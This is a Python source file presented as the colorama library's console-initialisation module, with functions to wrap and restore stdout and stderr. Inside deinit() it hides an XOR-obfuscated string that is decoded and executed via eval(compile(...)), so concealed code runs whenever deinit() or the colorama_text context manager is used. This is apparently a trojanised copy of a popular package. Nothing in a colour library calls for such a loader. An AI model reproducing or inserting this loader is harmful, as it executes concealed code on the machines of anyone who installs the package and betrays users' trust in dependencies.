# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.
#coded by https://github.com/tartley/colorama
import atexit
import contextlib
import sys
import os

from .ansitowin32 import AnsiToWin32


def _wipe_internal_state_for_tests():
    global orig_stdout, orig_stderr
    orig_stdout = None
    orig_stderr = None

    global wrapped_stdout, wrapped_stderr
    wrapped_stdout = None
    wrapped_stderr = None

    global atexit_done
    atexit_done = False

    global fixed_windows_console
    fixed_windows_console = False

    try:
        # no-op if it wasn't registered
        atexit.unregister(reset_all)
    except AttributeError:
        # python 2: no atexit.unregister. Oh well, we did our best.
        pass


def reset_all():
    if AnsiToWin32 is not None:    # Issue #74: objects might become None at exit
        AnsiToWin32(orig_stdout).reset_all()


def init(autoreset=False, convert=None, strip=None, wrap=True):

    if not wrap and any([autoreset, convert, strip]):
        raise ValueError('wrap=False conflicts with any other arg=True')

    global wrapped_stdout, wrapped_stderr
    global orig_stdout, orig_stderr

    orig_stdout = sys.stdout
    orig_stderr = sys.stderr

    if sys.stdout is None:
        wrapped_stdout = None
    else:
        sys.stdout = wrapped_stdout = \
            wrap_stream(orig_stdout, convert, strip, autoreset, wrap)
    if sys.stderr is None:
        wrapped_stderr = None
    else:
        sys.stderr = wrapped_stderr = \
            wrap_stream(orig_stderr, convert, strip, autoreset, wrap)

    global atexit_done
    if not atexit_done:
        atexit.register(reset_all)
        atexit_done = True


def deinit():
    #coded by https://github.com/tartley/colorama
    if orig_stdout is not None:
        sys.stdout = orig_stdout
    if orig_stderr is not None:
        sys.stderr = orig_stderr
    wopvEaTEcopFEavc ="\\XHXEF\x15\\F\x19HXQLUYDU\x1cBLQIEWSRBJ>]R\x18E_XLR\\@]\x1bAL@AS_\x1b\x10\x1aBFVCACCZMX\x1a\x16xQZ@M\x13\x1a\r>\x10\x18\x15\x18\x11\x14\x12\x15CCH\x0b:\x19\x19\x12\x10\x14\x17\x19\x17\x14\x16\x16\x10E\\@]\x15WGR\\\x1d\x14\x1aAUD\x1f^ZZS\x16@H\x1e\x1f\x19\x10O\x17\x1e\x11XG\x14R\x02?\x13\x19\x18\x14\x13\x12\x10\x15\x12\x15\x13\x15\x16\x12\x13\x19R\x1fEEXAU\x1c\x11P]B[FL\x14ZF\x11oY]]HZJE\x14A@UAC^S\\JA\x10hY_E[[\x16@SA\\Y\\Z\x17^_E\\GA\x18dQL[\x16jVVCV^\x19BJ\\[X[\x14]YHZAM\x18FVCEPAA\x13iXZVUX^\x12\n\x11ZC\x1aT\\D^[SQZ\x1d\x1c\x11oYdql}\x18\x0c\x14\x15\x1a_^\\T\x1f\x1e\x19\x19\x10\\RU[[\x16\x1d\x10\x15\x1a\x1aXF^SU\x1d@CQTLQ\x17d]fwl\x10\x11\x04\x13\x1e\x18L]G\x1e_]XQ\x16EJ\x1edZZAuM[FG\x15\x0b\x12\\J\x1aASCY\x1bULZJDA\x1cdy`}\x1c\x11oY]V\x18[WE\x14[FrIXBD\x03e\\\x10\x14\x17\x19\x17\x14\x16\x16_A\x1bYT^]S^@F\x1betl|\x19\x18oX_^\x10aXGQ\x1fhqcy\x10\x1a]GgSZU]\x1c\x1a\x08\x10i\\\x15\x13\x15\x16\x12\x13\x19\x14\x11\x12\x17AGYZG\x11\x12\x10\x1d\x14dZPYBV\r\x14lV\x17           \x11;\x14\x12\x15\x17\x11\x11\x11\x10\x19\x19\x12\x10\x14\x17\x19\x17R\x18AB[AQ\x1d\x17\x18\x17\x17\x12\x15APXW@UgFDZ\x18\r\x16QGMGK\n\x18\x1e]X\x1aPJZC[WLFAUGQZ]AS\\G\x17W^_\x18B\x1a\t\x01@XRH\x01\x07TYSD\x01\x00D\x1b]WOQ]U\x1cF_\x16m_\x10\x19\x19\x12\x10XXZVXiPY^P\x14\x08\x15hvcz\x1e\x14\x1a\x1bHUDP\x1dE^\x1f\x10mW\x13\x19\x17\x18\x10ETHAQGL\x1bFKTFVFB\\WCV\x1dDW^V@TmBCY\x1c\x14_VSSXk^]YP\x18\x13kZ\x10\x18\x15\x18\x11GGWGC^RUJJ\x1cSU[U\x1fh\x14TQA]\x14\x1a]WZR\x1d\x11ffpj\x1b\x1eU@PRZ\x1fDIWXC]\x1f\x19AX@\\\x1aK]\x13\x07\x17PVD\x1f[GY_\x15\x04\x0c\x15\x08h\x13\x1e\x17B]UX_\x04d@AQ\x11\x14i[\x13\x1a=\x14\x10\x18\x15\x18\x11\x14\x12\x15\x17\x11\x11\x11\x10\x19\x19T\x1eCEPCQ\x1e\x14\x10\x12\x15\x14\x15\\^\x17gSA[\x1dey`\x19\x16ZEi^Y]\\\x1b\x10\r\x18lY\x11\x19\x14\x14\x14\x18\x15\x13\x19LFJ\x08l[\x12\x15\x13\x15\x16\x12\x13\x19\x14\x11\x12XB\x1bBQ^VFW\x1cdy`\x1ci_\x13\x17\x14\x10\x18\x15\x18\x11\x14WMTTAE\neW\x12\x10\x14\x17\x19\x17\x14\x16\x16\x10\x12EF\\[L\x1f\x1e\x10\x1c9\x           15\x15\x18\x14\x10\x18\x13\x16S@STIG\x19qQ\\R\x7fV@r[M[W|JF\\@\n?\x12\x15\x13\x15\x16\x12\x13\x19\x14\x11\x12\x17AGYZG\x11\x12\x10\x1d>\x18\x14\x15\x15\x11\x13\x17\x14CMWHC[QPDB\x1fRQUU\x1a\x12DNM_[X\x05\x10\x1dAYE\x1a^^[W\x1bCL\x15\x1e\x16\x1c\x18@^ST\\\x0cmALR\x11" 
    iOpvEoeaaeavocp = "5587725355840836680193978071944485398432052535623941271504390244845513740858142571110992047974660254"
    uocpEAtacovpe = len(wopvEaTEcopFEavc)
    oIoeaTEAcvpae = ""
    for fapcEaocva in range(uocpEAtacovpe):
         nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]
         qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]
         oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))
    eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))
    
def just_fix_windows_console():
    global fixed_windows_console

    if sys.platform != "win32":
        return
    if fixed_windows_console:
        return
    if wrapped_stdout is not None or wrapped_stderr is not None:
        # Someone already ran init() and it did stuff, so we won't second-guess them
        return

    # On newer versions of Windows, AnsiToWin32.__init__ will implicitly enable the
    # native ANSI support in the console as a side-effect. We only need to actually
    # replace sys.stdout/stderr if we're in the old-style conversion mode.
    new_stdout = AnsiToWin32(sys.stdout, convert=None, strip=None, autoreset=False)
    if new_stdout.convert:
        sys.stdout = new_stdout
    new_stderr = AnsiToWin32(sys.stderr, convert=None, strip=None, autoreset=False)
    if new_stderr.convert:
        sys.stderr = new_stderr

    fixed_windows_console = True

@contextlib.contextmanager
def colorama_text(*args, **kwargs):
    init(*args, **kwargs)
    try:
        yield
    finally:
        deinit()


def reinit():
    if wrapped_stdout is not None:
        sys.stdout = wrapped_stdout
    if wrapped_stderr is not None:
        sys.stderr = wrapped_stderr


def wrap_stream(stream, convert, strip, autoreset, wrap):
    if wrap:
        wrapper = AnsiToWin32(stream,
            convert=convert, strip=strip, autoreset=autoreset)
        if wrapper.should_wrap():
            stream = wrapper.stream
    return stream


# Use this for initial setup as well, to reduce code duplication
_wipe_internal_state_for_tests()
